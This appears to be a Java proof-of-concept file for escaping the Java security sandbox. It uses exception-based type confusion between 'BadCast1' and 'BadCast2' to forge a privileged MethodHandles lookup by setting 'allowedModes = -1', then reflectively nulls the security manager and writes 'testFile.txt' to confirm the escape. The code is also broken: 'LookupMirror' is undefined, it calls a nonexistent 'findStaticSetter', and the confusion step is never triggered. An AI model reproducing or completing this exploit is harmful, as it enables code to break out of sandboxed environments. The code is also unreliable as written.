import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.io.*;
import java.io.IOException;

public class Main {
	public static class BadCast1 extends Throwable{
		Object o1 = MethodHandles.publicLookup();
	}
	
	public static class BadCast2 extends Throwable{
		LookupMirror lm = new LookupMirror();
	}
	
	public static void throwEx() throws BadCast1{
		throw new BadCast1();
	}
	
	public static void handleEx(BadCast2 e){
		e.lm.allowedModes = -1;
	}
	
	public static void main(String[] args) throws Throwable {
		BadCast2 t = new BadCast2();
		handleEx(t);
		MethodType mt = MethodType.methodType(void.class, System.class);
		MethodHandle mh = MethodHandles.lookup().findStatic(System.class, "findStaticSetter", mt);
		mh.invokeExact(System.class, null);

		try{

			File file = new File("testFile.txt");
			if(file.createNewFile()){
				System.out.println("Okay");
			}else{
				System.out.println("Nope");
			}

		}catch(IOException e){
			e.printStackTrace();
		}

	}

}
